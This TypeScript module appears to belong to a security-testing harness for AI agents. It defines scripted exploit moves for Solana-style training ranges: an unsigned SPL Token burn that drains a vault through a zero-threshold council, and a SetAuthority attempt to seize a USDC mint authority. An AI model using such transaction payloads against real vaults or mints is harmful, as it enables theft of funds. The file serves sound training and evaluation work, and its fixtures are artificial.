/**
 * The known moves on Ryntra's training ranges (CITY-238) — for the machine's own check (`../machine/check.mjs`) and for
 * the brain without a model that walks a developer's stand (`../runner/stub-brain.ts`, never production). Each is what
 * an agent would name to the harness: the account to look at first, the instructions to try, and the finding to file
 * if the fault reproduces. The harness assembles and signs them with the run's own payer (`../runner/assemble.ts`).
 *
 *   open-multisig — burn one token out of the practice vault, naming the council as the authority with no signature at
 *                   all: the council's threshold was left at zero, so the token program lets it through and the check
 *                   «the vault holds» breaks. The fault reproduces.
 *   usdc-mint     — ask the token program to hand the USDC mint authority to the payer, signed by the payer alone: the
 *                   program refuses (the owner does not match) and the check holds. Nothing reproduces — the honest
 *                   range, where an agent learns that «no» is an answer too.
 *   council-review — the same burn as on open-multisig, but the protocol's check («the council's threshold is two»)
 *                   is one its own recorded copy already does not meet.
 *
 * Pure: no store, no clock, no network.
 */

import { sha256Hex } from "../../../../../lib/ring/judge/index.ts";
import type { Severity } from "../finding.ts";
import type { InstructionSpec } from "../runner/assemble.ts";
import type { FindingTarget } from "../scope.ts";
import type { RangeRecord } from "./range.ts";

export type PracticeMoves = {
  readonly inspect: string;
  readonly exploit: readonly { readonly instructions: readonly InstructionSpec[] }[];
  readonly finding: { readonly target: FindingTarget; readonly vulnClass: string; readonly severity: Severity; readonly title: string };
  /** File the run even when the judge will not be able to decide it: the protocol's owner looks. */
  readonly undecided?: boolean;
};

/** SPL Token's instruction numbers used here. */
const SET_AUTHORITY = 6;
const BURN = 8;

function u64(value: bigint): Buffer {
  const out = Buffer.alloc(8);
  out.writeBigUInt64LE(value);
  return out;
}

/** The moves for a range, with `payer` as the run's own fee payer; `null` for a range with none written down. */
export function practiceMoves(range: Pick<RangeRecord, "id" | "target" | "watch">, payer: string): PracticeMoves | null {
  const program = range.target.program;
  if (range.id === "open-multisig" || range.id === "council-review") {
    const [vault, council, mint] = range.watch as [string, string, string];
    const burnOne = Buffer.concat([Buffer.from([BURN]), u64(1n)]).toString("base64");
    const review = range.id === "council-review";
    return {
      inspect: council,
      exploit: [{ instructions: [{ program, accounts: [{ address: vault, writable: true }, { address: mint, writable: true }, { address: council }], data: burnOne }] }],
      finding: review
        ? { target: { program, account: council }, vulnClass: "misconfiguration", severity: "high", title: "The council's threshold is not the two the protocol expects" }
        : { target: { program, account: vault }, vulnClass: "auth-bypass", severity: "critical", title: "The council's threshold is zero: anyone moves the vault" },
      ...(review ? { undecided: true } : {}),
    };
  }
  if (range.id === "usdc-mint") {
    const mint = range.watch[0]!;
    // SetAuthority(MintTokens → a new key), with the payer as the «current authority» and its signature only.
    const takeMint = Buffer.concat([Buffer.from([SET_AUTHORITY, 0, 1]), Buffer.from(sha256Hex("ryntra hack practice: a new authority"), "hex")]).toString("base64");
    return {
      inspect: mint,
      exploit: [{ instructions: [{ program, accounts: [{ address: mint, writable: true }, { address: payer, signer: true }], data: takeMint }] }],
      finding: { target: { program, account: mint }, vulnClass: "auth-bypass", severity: "critical", title: "The mint authority can be taken" },
    };
  }
  return null;
}
